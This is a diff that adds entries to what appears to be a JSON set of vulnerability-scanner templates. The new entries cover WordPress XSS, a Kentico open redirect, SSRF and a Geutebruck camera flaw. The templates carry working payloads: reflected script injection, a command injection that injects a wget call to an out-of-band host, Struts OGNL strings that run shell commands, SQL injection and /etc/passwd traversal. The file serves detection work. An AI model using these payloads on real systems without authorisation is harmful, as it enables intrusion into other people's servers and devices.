@@ -421,6 +421,47 @@
       ]
     },
     {
+      "id": "CVE-2012-4242",
+      "info": {
+        "author": "daffainfo",
+        "name": "WordPress Plugin MF Gig Calendar 0.9.2 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2012-4242",
+        "severity": "medium",
+        "tags": "cve,cve2012,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?page_id=2&%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2013-1965",
       "info": {
         "author": "pikpikcu",
@@ -527,6 +568,47 @@
             "GET /index.action?§params§:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept: */*\nAccept-Language: en\n",
             "GET /login.action?§params§:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept: */*\nAccept-Language: en\n",
             "GET /index.action?§params§%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept: */*\nAccept-Language: en\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2013-2287",
+      "info": {
+        "author": "daffainfo",
+        "name": "WordPress Plugin Uploader 1.0.4 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2013-2287",
+        "severity": "medium",
+        "tags": "cve,cve2013,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123);</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/uploader/views/notify.php?notify=unnotif&blog=%3Cscript%3Ealert%28123%29;%3C/script%3E"
           ]
         }
       ]
@@ -1192,6 +1274,34 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5(8888)),1)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2015-7823",
+      "info": {
+        "author": "0x_Akoko",
+        "description": "The GetDocLink.ashx  with link variable is vulnerable to open redirect vulnerability",
+        "name": "Kentico CMS 8.2 Open Redirection",
+        "reference": "- https://packetstormsecurity.com/files/133981/Kentico-CMS-8.2-Cross-Site-Scripting-Open-Redirect.html\n- https://nvd.nist.gov/vuln/detail/CVE-2015-7823\n",
+        "severity": "low",
+        "tags": "cve,cve2015,kentico,redirect"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "regex": [
+                "(?m)^(?:Location\\s*?:\\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com.*$"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/CMSPages/GetDocLink.ashx?link=https://example.com/"
           ]
         }
       ]
@@ -2369,7 +2479,7 @@
     {
       "id": "CVE-2017-5487",
       "info": {
-        "author": "Manas_Harsh,daffainfo",
+        "author": "Manas_Harsh,daffainfo,geeknik",
         "description": "wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php in the REST API implementation in WordPress 4.7 before 4.7.1 does not properly restrict listings of post authors, which allows remote attackers to obtain sensitive information via a wp-json/wp/v2/users request.",
         "name": "WordPress Core < 4.7.1 - Username Enumeration",
         "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2017-5487\n- https://www.exploit-db.com/exploits/41497\n",
@@ -2379,6 +2489,13 @@
       "requests": [
         {
           "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            },
             {
               "status": [
                 200
@@ -13511,6 +13628,40 @@
       ]
     },
     {
+      "id": "CVE-2021-24472",
+      "info": {
+        "author": "Suman_Kar",
+        "description": "The theme and plugin have exposed proxy functionality to unauthenticated users, sending requests to this proxy functionality will have the web server fetch and display the content from any URI, this would allow for SSRF (Server Side Request Forgery) and RFI (Remote File Inclusion) vulnerabilities on the website.",
+        "name": "Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Unauthenticated RFI and SSRF",
+        "reference": "https://wpscan.com/vulnerability/17591ac5-88fa-4cae-a61a-4dcf5dc0b72a",
+        "severity": "high",
+        "tags": "cve,cve2021,wordpress,lfi,ssrf,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /?qtproxycall=http://{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24495",
       "info": {
         "author": "johnjhacking",
@@ -14881,6 +15032,33 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-33544",
+      "info": {
+        "author": "gy741",
+        "description": "Multiple vulnerabilities in the web-based management interface of Geutebruck could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.",
+        "name": "Geutebruck RCE",
+        "reference": "- https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilities/\n",
+        "severity": "critical",
+        "tags": "cve,cve2021,geutebruck,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET //uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://{{interactsh-url}})&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nCache-Control: max-age=0\nConnection: keep-alive\n"
           ]
         }
       ]
